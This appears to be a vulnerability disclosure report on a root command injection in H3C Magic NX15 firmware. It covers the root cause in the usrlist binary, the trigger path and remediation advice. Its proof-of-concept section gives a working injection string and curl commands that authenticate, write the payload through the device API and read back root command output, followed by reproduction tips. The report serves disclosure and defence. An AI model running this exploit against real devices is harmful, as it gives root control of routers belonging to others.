# Post-auth Root RCE via `usrlist` command injection

- **Vendor / Product**: H3C / Magic NX15
- **Affected version**: `NX15V100R017` (internal `NX15V100D025`)
- **Vulnerability type**: OS Command Injection (CWE-78)
- **Privilege required**: authenticated administrator (the `/api/esps` RPC
  requires an `AUTHENTICATION` session token)
- **Impact**: remote command execution as **root**
- **CVSS 3.1**: `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` = **7.2**

---

## 1. Sample identity

| Item | Value |
|---|---|
| Firmware | `NX15V100R017` (`softwareverinternal=NX15V100D025`) |
| Test device | SN `219801A40R6256L002WF`, MAC `70:2A:D7:9C:17:D2` |
| SoC / SDK | Realtek RTL819xD v1.0 / Realtek SDK v3.4.14-r21961 |
| Architecture | MIPS32 Release 2, little endian, o32, uClibc 0.9.33 |
| Kernel | Linux 4.4.176-svn22943 |

SHA-256:

```text
firmware image   a46ce7e8db354f1ad19629074a7a216663a046f5996e5d9020a8fed67c2d6f4b
usr/bin/usrlist  16f1ce7ca0aaed47cc81ba3185550acd16c9724fe4fdb9990c18c9de6c4b721a
```

---

## 2. Root cause

`/usr/bin/usrlist`, function `sub_416874` (`0x416874`–`0x416E9C`):

```c
char v8[1024];                                              // [sp+30h]

snprintf(v9, 256, "cat %s | wc -l", "/var/run/agentlist");  // 0x0041695c
v6 = popen(v9, "r");                                        // 0x00416974
fgets(v10, 1023, v6);                                       // 0x004169c0
sscanf(v10, "%d\n", &v12);                                  // line count
...
while ( fgets(v10, 1024, v5) != 0 )                         // 0x00416c90
{
    v10[strlen(v10) - 1] = 0;                               // strip newline
    if ( i == 1 ) strncpy(v8, v10, 1023);
    else          strcat(v8, v10);
    *(_WORD *)&v8[strlen(v8)] = 124;                        // append '|' and NUL
}
...
snprintf(v10, 1024,
    "cat %s | grep -E \"%s\" | awk '{print $3}'",           // format @0x41ED98
    "/tmp/mac_table.txt", v8);                              // 0x00416d14
v6 = popen(v10, "r");                                       // 0x00416d2c  ← sink
```

The value `v8` — built from the contents of `/var/run/agentlist` — is inserted
as `%s` **between a pair of double quotes**. No escaping or character filtering
is performed. A single `"` in a line therefore terminates the quoting and allows
arbitrary shell commands to be appended.

### Address index

| Meaning | Address |
|---|---|
| line count (`snprintf` / `popen`) | `0x0041695c` / `0x00416974` |
| per-line read | `fgets` `0x00416c90` |
| accumulation | `strncpy` `0x00416ba4`, `0x00416bd0`; `strcat` `0x00416c28` |
| **sink construction** | `snprintf` `0x00416d14`, format string `0x41ED98` |
| **sink** | `popen` `0x00416d2c` |
| data source literal | `/var/run/agentlist` @ `0x41EED0` |

---

## 3. Automatic trigger

```text
sub_4188E0                                uloop_timeout_set(&unk_430494, 1000)   ← 1s timer
  └─ sub_4139F8        @0x4139F8
       └─ sub_4170E0   @0x4170E0   USRLIST_Terminal_ReadMacTable
            ├─ system("cat /proc/rtl_8367r_vlan | grep Auto > /tmp/mac_table.txt")
            └─ sub_416874  @0x416874   ← vulnerable function
```

The process is supervised by `procd`:

```text
/etc/init.d/usrlist:  procd_set_param command /usr/bin/usrlist "$ipacctStat"
                      procd_set_param respawn
/etc/rc.d/S98usrlist -> ../init.d/usrlist
```

Log evidence that the callback runs continuously
(`/var/log/usrlist`):

```text
<...> [USRLIST_Terminal_ReadMacTable.5232] remark: NX15
```

---

## 4. Data source

Only two binaries reference `/var/run/agentlist`:

```text
write: usr/bin/smartnet   (generates it from the EasyMesh topology)
read : usr/bin/usrlist    (this vulnerability)
```

In `smartnet`, function `sub_436C98` (`EasyMesh_ParseControllerCfg`) writes
network-derived JSON array elements into the file:

```c
v5 = json_tokener_parse(a1);
v67 = json_object_object_get(v5, "maclist");
v68 = lock_ex_file("/var/run/agentlist");
for ( v69 = 0; v69 < json_object_array_length(v67); v69++ ) {
    idx    = json_object_array_get_idx(v67, v79);
    string = json_object_get_string(idx);
    fprintf(v68, "%s\n", string);          // verbatim, no validation
}
```

Neither write site validates length or character set. A second write site,
`sub_40C154` (invoked from `main`), copies fixed-offset topology struct fields
(`astSta[].szMac`) in the same unchecked manner.

> **Scope note.** The EasyMesh delivery path is gated by the mesh backhaul SSID:
> `sub_436C98` is only reached when
> `meshBHSsid != "H3CEasyMesh-Dummy"` (the factory default is exactly that
> string). This report therefore claims only the **authenticated** delivery
> path, which was verified end to end. No unauthenticated claim is made.

---

## 5. Deliverability of the payload

The `/api/esps` body filter is `FCGI_CheckStringIfContainsSemicolon_Esps`
(`/www/api` @ `0x407E0C`), which inspects the raw request bytes for **the single
quote character `0x27` only**:

```asm
0x00407e0c  li      $v0, 1
0x00407e10  bnez    $a0, loc_407E28
0x00407e14  li      $v1, 0x27          # '''  ← the only character checked
0x00407e20  beq     $v0, $v1, locret_407E3C
```

`"` `;` `$` `` ` `` `|` `>` and newline all pass. This is sufficient to close
the double quotes in the sink, so the injection is deliverable through the
supported API.

---

## 6. Proof of concept

Injection line (single line, ~40 bytes — deliberately far below the 1024-byte
buffer, so that the **stack overflow is not triggered** and the two issues stay
separated):

```text
x";id>/www/download/poc.txt;echo "y
```

The command actually executed by `usrlist`:

```sh
cat /tmp/mac_table.txt | grep -E "x";id>/www/download/poc.txt;echo "y|" | awk '{print $3}'
```

```bash
T=$(curl -s -X POST -H 'Content-Type: application/json' \
      -d '{"username":"H3C","password":"<admin>"}' \
      http://<target>/api/login/auth | sed -n 's/.*"session":"\([^"]*\)".*/\1/p')

curl -s -X POST -H 'Content-Type: application/json' -H "AUTHENTICATION: $T" \
  -d '[{"id":1,"object":"file","method":"write","param":{"path":"/var/run/agentlist","data":"x\";id>/www/download/poc.txt;echo \"y\n"}}]' \
  http://<target>/api/esps
sleep 9
curl -s http://<target>/download/poc.txt
```

### 6.1 Command execution

```text
GET /download/poc.txt  ->  HTTP 200
uid=0(root) gid=0(root)
```

The output path is `/www/download/`, the only writable directory exposed
directly by lighttpd (`/download/` is a pass-through prefix; other paths are
rewritten to the SPA index).

### 6.2 Attribution (decisive)

To rule out any other execution path, the injected command was made to report
its own parent process:

```text
injection:  x";cat /proc/$PPID/stat>/tmp/inj_parent;echo "y

/tmp/inj_parent = '5508 (usrlist) S 1 1 1 0 -1 4194304 6240 234185 0 0 71 79 831 ...'
ps (usrlist)    = '5508 root 3952 S /usr/bin/usrlist 0'
```

PID `5508` and the `(usrlist)` name field match exactly, proving the command was
executed by `usrlist`'s `popen()` call as root.

> `file.exec` (a separate RPC) accepts only a single executable name and cannot
> perform `;` chaining or redirection, so it cannot produce this result. The
> attribution is therefore unambiguous.

---

## 6.3 Note on the delivery primitive

Delivery uses `file.write`, which is **itself a root arbitrary file write**: it
performs no path validation and executes inside `rpcd` as root. It is reported
separately as `../../file_write_root_rce/`.

It is used here only because `/var/run/agentlist` is absent by default and must
be created. It is the *delivery primitive*, not a prerequisite vulnerability —
neither issue depends on the other.

## 7. Practical notes for reproducers

1. **The payload must end with `\n`.** `sub_416874` contains
   `v10[strlen(v10) - 1] = 0;` (strip newline). Without the trailing newline,
   the last character of the payload is stripped instead, leaving `echo "`
   unterminated — the whole command line becomes a syntax error and nothing
   executes. This is a silent failure and was hit during development.
2. **Redirect the output yourself.** The `popen` stdout is consumed by the
   trailing `awk`, so an unredirected command produces no retrievable output.
3. **Write output to `/www/download/`.** Other paths under `/www` are rewritten
   to the SPA index and return the index page, not your file.
4. **A double quote needs no encoding** on this path — the filter only rejects
   `0x27` (see §5).

---

## 8. Remediation

- Do not build shell commands by string interpolation. Use
  `execv`/`execvp` with an argument vector, so no shell is involved.
- If a shell is unavoidable, validate `v8` against a strict allow-list (for
  example `[0-9A-Fa-f:.\-]`, i.e. MAC-address syntax) instead of placing it
  inside quotes.
- Align `FCGI_CheckStringIfContainsSemicolon_Esps` with the stricter
  `FCGI_CheckStringIfContainsSemicolon` variant, and more fundamentally stop
  relying on character blacklists for shell safety.
- Sanitise the fields written into `/var/run/agentlist` at the write sites in
  `smartnet` (defence in depth).

---

## 9. References

- Firmware download portal:
  <https://www.h3c.com/cn/Service/Document_Software/Software_Download/Consume_product/>
- Companion reports for the same firmware: see the sibling
  directories of this one (each contains its own report and PoC).
